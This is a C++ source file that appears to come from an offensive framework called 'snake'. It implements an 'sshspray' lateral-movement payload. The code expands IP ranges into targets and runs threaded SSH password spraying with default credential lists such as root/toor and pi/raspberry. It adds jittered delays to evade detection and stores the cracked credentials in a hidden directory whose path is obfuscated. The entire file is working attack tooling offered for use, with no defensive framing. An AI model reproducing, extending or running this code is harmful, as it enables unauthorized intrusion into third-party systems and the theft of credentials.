#ifndef _WIN32

#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <poll.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/rand.h>

#include <algorithm>
#include <cerrno>
#include <chrono>
#include <condition_variable>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

#include "snake/payloads.hpp"
#include "snake/stealth.hpp"
#include "ssh_client.hpp"

namespace snake::payloads {
namespace {

using OJ = nlohmann::ordered_json;

using sshdet::SshClient;
using sshdet::local_stamp;
using sshdet::now_rfc3339_utc;
using sshdet::temp_dir;

bool try_ssh(const std::string& host, const std::string& username, const std::string& password,
             int timeout_sec) {
    if (safe_mode()) return false;
    SshClient c;
    return c.auth_password(host, 22, username, password, timeout_sec);
}

int parse_leading_int(const std::string& s, int fallback) {
    size_t i = 0;
    while (i < s.size() && (s[i] == ' ' || s[i] == '\t')) ++i;
    bool neg = false;
    if (i < s.size() && (s[i] == '+' || s[i] == '-')) {
        neg = (s[i] == '-');
        ++i;
    }
    size_t start = i;
    long long v = 0;
    while (i < s.size() && s[i] >= '0' && s[i] <= '9') {
        v = v * 10 + (s[i] - '0');
        if (v > 2147483647LL) v = 2147483647LL;
        ++i;
    }
    if (i == start) return fallback;
    return (int)(neg ? -v : v);
}

bool expand_cidr(const std::string& target, std::vector<std::string>& out, bool& ok) {
    ok = false;
    size_t slash = target.find('/');
    if (slash == std::string::npos) return false;
    std::string ip_part = target.substr(0, slash);
    int bits = parse_leading_int(target.substr(slash + 1), -1);
    struct in_addr addr;
    if (ip_part.empty() || bits < 0 || bits > 32) return false;
    if (inet_pton(AF_INET, ip_part.c_str(), &addr) != 1) return false;
    ok = true;
    uint64_t ip = ntohl(addr.s_addr);
    uint64_t mask =
        (bits == 0) ? 0ULL : (bits >= 32 ? 0xffffffffULL : (0xffffffffULL << (32 - bits)));
    uint64_t network = ip & mask;
    uint64_t limit = network + ((bits >= 32) ? 1ULL : (1ULL << (32 - bits)));
    if (limit > 0x100000000ULL) limit = 0x100000000ULL;
    for (uint64_t cur = network; cur < limit; ++cur) {
        if (cur != network) {
            struct in_addr a;
            a.s_addr = htonl((uint32_t)cur);
            char buf[INET_ADDRSTRLEN];
            if (inet_ntop(AF_INET, &a, buf, sizeof(buf)) != nullptr) out.push_back(buf);
        }
        if (out.size() >= 256) break;
    }
    return true;
}

std::vector<std::string> expand_target(const std::string& target) {
    std::vector<std::string> out;
    if (target.find('/') != std::string::npos) {
        bool ok = false;
        expand_cidr(target, out, ok);
        if (ok) return out;
    }
    size_t dots = (size_t)std::count(target.begin(), target.end(), '.');
    size_t dash = target.find('-');
    if (dash != std::string::npos && dots == 3) {
        size_t last_dot = target.rfind('.');
        std::string base = target.substr(0, last_dot);
        std::string range_str = target.substr(last_dot + 1);
        size_t rdash = range_str.find('-');
        if (rdash != std::string::npos) {
            int start = parse_leading_int(range_str.substr(0, rdash), -1);
            int end = parse_leading_int(range_str.substr(rdash + 1), -1);
            if (start >= 0 && end >= 0) {
                for (int i = start; i <= end && i <= 255; ++i) {
                    out.push_back(base + "." + std::to_string(i));
                }
            }
            return out;
        }
    }
    out.push_back(target);
    return out;
}

struct SshCred {
    std::string target;
    std::string username;
    std::string password;
    std::string time;
};

class SshSpray : public Payload {
  public:
    const char* name() const override { return "sshspray"; }
    const char* category() const override { return "lateral"; }
    const char* description() const override {
        return "SSH credential spraying with goroutine worker pool";
    }

    Output execute(const Args& args) const override {
        auto arg = [&](const char* k) -> std::string {
            auto it = args.find(k);
            return (it == args.end()) ? std::string() : it->second;
        };
        int threads = parse_leading_int(arg("threads"), 5);
        int timeout_sec = parse_leading_int(arg("timeout"), 5);
        if (threads < 1) threads = 1;

        OJ r = OJ::object();
        r["timestamp"] = now_rfc3339_utc();
        r["successful"] = 0;
        r["failed"] = 0;
        r["errors"] = 0;
        r["credentials"] = nullptr;
        r["total_attempts"] = 0;

        std::vector<std::string> targets;
        std::string target_file = arg("target_file");
        if (!target_file.empty()) {
            std::string data;
            if (read_file(target_file, data)) {
                for (const auto& raw : split(data, '\n')) {
                    std::string line = trim(raw);
                    if (line.empty()) continue;
                    for (auto& t : expand_target(line)) targets.push_back(t);
                }
            }
        }
        std::string targets_str = arg("targets");
        if (!targets_str.empty()) {
            for (const auto& raw : split(targets_str, ',')) {
                std::string t = trim(raw);
                if (t.empty()) continue;
                for (auto& e : expand_target(t)) targets.push_back(e);
            }
        }

        std::vector<std::string> usernames = {"root",  "admin",   "ubuntu", "pi",
                                              "test",  "user",    "oracle", "postgres"};
        std::vector<std::string> passwords = {"password", "123456",    "admin", "root",
                                              "test",     "password123", "toor",  "raspberry",
                                              "changeme"};
        std::string users_str = arg("usernames");
        std::string pass_str = arg("passwords");
        if (!users_str.empty()) {
            usernames.clear();
            for (const auto& u : split(users_str, ',')) usernames.push_back(u);
        }
        if (!pass_str.empty()) {
            passwords.clear();
            for (const auto& p : split(pass_str, ',')) passwords.push_back(p);
        }

        std::vector<SshCred> creds;
        int successes = 0;
        int failed = 0;

        if (!targets.empty()) {
            std::mutex mu;
            std::vector<std::thread> workers;
            int slots = threads;
            std::mutex slot_mu;
            std::condition_variable slot_cv;

            auto acquire = [&]() {
                std::unique_lock<std::mutex> lk(slot_mu);
                slot_cv.wait(lk, [&]() { return slots > 0; });
                slots--;
            };
            auto release = [&]() {
                std::lock_guard<std::mutex> lk(slot_mu);
                slots++;
                slot_cv.notify_one();
            };

            bool stop = false;
            for (const auto& target : targets) {
                for (const auto& user : usernames) {
                    for (const auto& pass : passwords) {
                        {
                            std::lock_guard<std::mutex> lk(mu);
                            if ((int)creds.size() > 50) {
                                stop = true;
                                break;
                            }
                        }
                        acquire();
                        std::string u = trim(user);
                        std::string p = trim(pass);
                        workers.emplace_back([&, target, u, p]() {
                            bool ok = try_ssh(target, u, p, timeout_sec);
                            {
                                std::lock_guard<std::mutex> lk(mu);
                                if (ok) {
                                    SshCred c;
                                    c.target = target;
                                    c.username = u;
                                    c.password = p;
                                    c.time = now_rfc3339_utc();
                                    creds.push_back(c);
                                    successes++;
                                } else {
                                    failed++;
                                }
                            }
                            struct timespec ts;
                            clock_gettime(CLOCK_REALTIME, &ts);
                            long jitter = (long)(ts.tv_nsec % 1000);
                            std::this_thread::sleep_for(
                                std::chrono::milliseconds(100 + jitter));
                            release();
                        });
                    }
                    if (stop) break;
                }
                if (stop) break;
            }
            for (auto& w : workers) w.join();
        }

        r["successful"] = successes;
        r["failed"] = failed;
        r["total_attempts"] = successes + failed;
        if (!creds.empty()) {
            OJ arr = OJ::array();
            for (const auto& c : creds) {
                OJ o = OJ::object();
                o["target"] = c.target;
                o["username"] = c.username;
                o["password"] = c.password;
                o["timestamp"] = c.time;
                arr.push_back(o);
            }
            r["credentials"] = arr;
        }

        std::string cache_dir = temp_dir() + SNAKE_OBF("/.rogue/ssh");
        mut_mkdir_p(cache_dir, 0700);
        std::string cred_file = cache_dir + "/ssh_creds_" + local_stamp() + ".txt";
        std::string body;
        for (size_t i = 0; i < creds.size(); ++i) {
            if (i != 0) body += "\n";
            body += creds[i].target + ":" + creds[i].username + ":" + creds[i].password;
        }
        mut_write(cred_file, body, 0600);

        std::string s = MarshalJSON(r);
        return Output(s.begin(), s.end());
    }
};

SshSpray g_sshspray;
struct Reg {
    Reg() { Register(&g_sshspray); }
} g_reg;

}  // namespace
}  // namespace snake::payloads

#else  // _WIN32

#include <string>

#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

class SshSpray : public Payload {
  public:
    const char* name() const override { return "sshspray"; }
    const char* category() const override { return "lateral"; }
    const char* description() const override {
        return "SSH credential spraying with goroutine worker pool";
    }
    Output execute(const Args&) const override {
        nlohmann::ordered_json r = nlohmann::ordered_json::object();
        r["timestamp"] = now_rfc3339();
        r["successful"] = 0;
        r["failed"] = 0;
        r["errors"] = 0;
        r["credentials"] = nullptr;
        r["total_attempts"] = 0;
        std::string s = MarshalJSON(r);
        return Output(s.begin(), s.end());
    }
};

SshSpray g_sshspray;
struct Reg {
    Reg() { Register(&g_sshspray); }
} g_reg;

}  // namespace
}  // namespace snake::payloads

#endif  // _WIN32
